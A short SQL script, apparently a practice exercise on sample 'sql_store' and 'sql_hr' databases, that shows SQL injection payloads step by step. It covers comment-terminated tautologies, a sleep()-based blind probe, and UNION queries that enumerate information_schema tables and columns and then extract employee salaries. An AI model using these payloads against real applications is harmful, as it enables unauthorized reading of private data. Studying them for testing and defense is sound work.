USE sql_store;

SELECT * FROM customers
WHERE last_name LIKE '%gh%';
--                    |__|

SELECT * FROM customers
WHERE last_name LIKE '%';-- %';

SELECT * FROM customers
WHERE last_name LIKE '%gh' AND 0 = sleep(2);-- %';

SELECT first_name FROM customers
UNION
SELECT customer_id FROM customers;

SELECT first_name, last_name, phone FROM customers
WHERE last_name LIKE '%gh' UNION (
	SELECT 1,2,3 FROM DUAL
);-- %';

SELECT first_name, last_name, phone FROM customers
WHERE last_name LIKE '%gh' UNION (
	SELECT TABLE_NAME, TABLE_SCHEMA,3 FROM information_schema.tables
);-- %';

SELECT first_name, last_name, phone FROM customers
WHERE last_name LIKE '%gh' UNION (
	SELECT COLUMN_NAME, 2,3 FROM information_schema.columns
    WHERE TABLE_NAME = 'employees'
);-- %';

SELECT first_name, last_name, phone FROM customers
WHERE last_name LIKE '%gh' UNION (
	SELECT job_title, office_id, salary FROM sql_hr.employees
);-- %';
